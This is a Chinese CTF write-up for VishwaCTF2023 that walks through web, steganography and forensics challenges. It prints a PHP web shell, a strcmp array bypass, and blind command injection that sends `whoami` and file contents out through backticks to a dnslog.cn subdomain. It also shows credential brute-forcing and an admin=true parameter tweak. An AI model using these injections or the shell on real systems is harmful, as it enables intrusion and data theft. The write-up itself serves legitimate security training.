## 【VishwaCTF2023】wp

### web

#### Payload

目录扫描，扫描到了`robots.txt`

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041515755.png" alt="image-20230404151550711" style="zoom: 50%;" />

我们访问`/robots.txt`：

```php
<?php
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
    else {
        if(isset($_GET['btn'])){
            echo "<b>System Details: </b>";
            system("uname -a"); 
        }
    }
?>
```

>  `uname`（英文全拼：unix name）命令用于显示操作系统信息，例如内核版本、主机名、处理器类型等。。
>
> uname 可显示电脑以及操作系统的相关信息。-a表示所有

很明显，这是命令执行，我们直接传参即可：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041519245.png" alt="image-20230404151920194" style="zoom:33%;" />

发现flag藏在环境变量中



#### Mascot

扫描一下目录，发现git泄露：

![image-20230404152202468](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041522644.png)

但是我们使用`GitHack`下载不下来，但是里面有一个 `FLAGGGGG.md`

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041526557.png" alt="image-20230404152658487" style="zoom:50%;" />

下载得到flag



#### Eeezzy

> I forgot my login details again!

view.php

```php
<?php

    session_start();
    $_SESSION['status']=null;

    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                $_SESSION['status']=$flag;
            else
                $_SESSION['status']="Invalid username or password";
        }
    } catch (Throwable $th) {
        $_SESSION['status']=$flag;
    }

?>
```

`strcmp()`函数可以使用数组绕过，

> **strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。**

这里我们只能让password为数组：

![image-20230404154539089](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041545169.png)



#### aLive

> In my college level project I created this website that tells us if any domain/ip is active or not. But there is a catch.

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041619439.png" alt="image-20230404161910385" style="zoom: 33%;" />

打开发现一个可以检测站点的输入框，检测只会提示是否active，并没有回显

看了wp，我知道了需要使用`DNSlog平台`，之前了解过，但是没有使用过[DNSlog](http://dnslog.cn/)

> 什么是DNSlog?
>
> 在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。
>
> DNS 的全称是 Domain Name System（网络名称系统），它作为将域名和 IP 地址相互映射，使人更方便地访问互联网。当用户输入某一网址如 www.baidu.com，网络上的 DNS Server 会将该域名解析，并找到对应的真实 IP 如 127.0.0.1，使用户可以访问这台服务器上相应的服务。
>
> 了解到了什么是 DNS，那么什么又是 DNSlog 呢？
>
> DNSlog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 www.baidu.com 等的访问信息，类似日志文件
>

我们使用DNSlog平台，生成一个DNS服务器：

![image-20230404162337417](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041623501.png)

然后我们使用输入框输入该域名，记得加上三级域名：

```
123.r736ym.dnslog.cn
```

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041626772.png" alt="image-20230404162601657" style="zoom: 25%;" />

成功外带，回显数据。

测试了一下，发现是RCE，于是我们如下构造：

```
`whoami`.r736ym.dnslog.cn
```

成功命令执行，说明是root用户

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041628538.png" alt="image-20230404162819440" style="zoom:33%;" />

```
`sort f*`.r736ym.dnslog.cn
```

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041629984.png" alt="image-20230404162930890" style="zoom: 25%;" />

获得flag



#### spooky

> I forgot my login credentials again!!

一个登录界面，sql注入无果，使用`dirsearch`扫描：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041841368.png" alt="image-20230404184137206" style="zoom:33%;" />

访问`/sitemap.xml`：

![image-20230404184245867](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041842940.png)

发现存放用户名和密码的文件，我们使用bp爆破一下：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041843484.png" alt="image-20230404184326412" style="zoom:33%;" />

注意攻击模式要选择这种（能够计算笛卡尔积）保证所有情况

![image-20230404184414191](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041844246.png)

使用账号密码登录

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041846712.png" alt="image-20230404184600637" style="zoom:33%;" />

提示权限为user，可能需要改为admin

![image-20230404184640710](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041846769.png)

加上 `&admin=true`





### Steganography

#### Can you see me?

> A magician made the seven wonders disappear. But people claim they can still feel their presence in the air.

将图片使用foremost分离，得到一个压缩包，里面有一个wav文件，我们使用`Audacity`打开：

![image-20230404180624552](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041806682.png)

选择频谱图，得到flag



#### Guatemala

使用010打开文件，发现是GIF图片

![image-20230404181143781](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041811545.png)

发现一串base64编码：

![image-20230404181545407](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041815453.png)

或者使用`exiftool`

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041819013.png" alt="image-20230404181922920" style="zoom:33%;" />

解码得到flag：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041816359.png" alt="image-20230404181643275" style="zoom: 33%;" />



#### I LOVE YOU

> There is an audio file given below... It is not so difficult but you will find it's sound very deep

根据提示，我们使用 `DeepSound` 去分离隐写在wav中的文件：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041932379.png" alt="image-20230404193252238" style="zoom:33%;" />

得到`welcome.exe`，看图标，很想使用python打包的exe文件，

我们使用工具`pyinstxtractor`进行反汇编：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041934630.png" alt="image-20230404193422962" style="zoom: 33%;" />

然后使用pyc[反编译网站进行反编译](https://tool.lu/pyc/)，得到flag

![image-20230404193515571](https://raw.githubusercontent.com/leekosss/photoBed/master/202304041935678.png)



### Forensics

#### The Sender Conundrum

> Marcus Got a Mysterious mail promising a flag if he could crack the password to the file.

打开电子邮件，叫我们猜一个人名

```
Hello Marcus Cooper,
You are one step behind from finding your flag. 
Here is a Riddle: 
I am a noun and not a verb or an adverb.
I am given to you at birth and never taken away,
You keep me until you die, come what may.
What am I?
```

我们使用字典进行爆破，但是都没有，最后使用了kali自带的词典：`rockyou.txt`，爆到了

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304042151462.png" alt="image-20230404215130384" style="zoom: 33%;" />

解压得flag




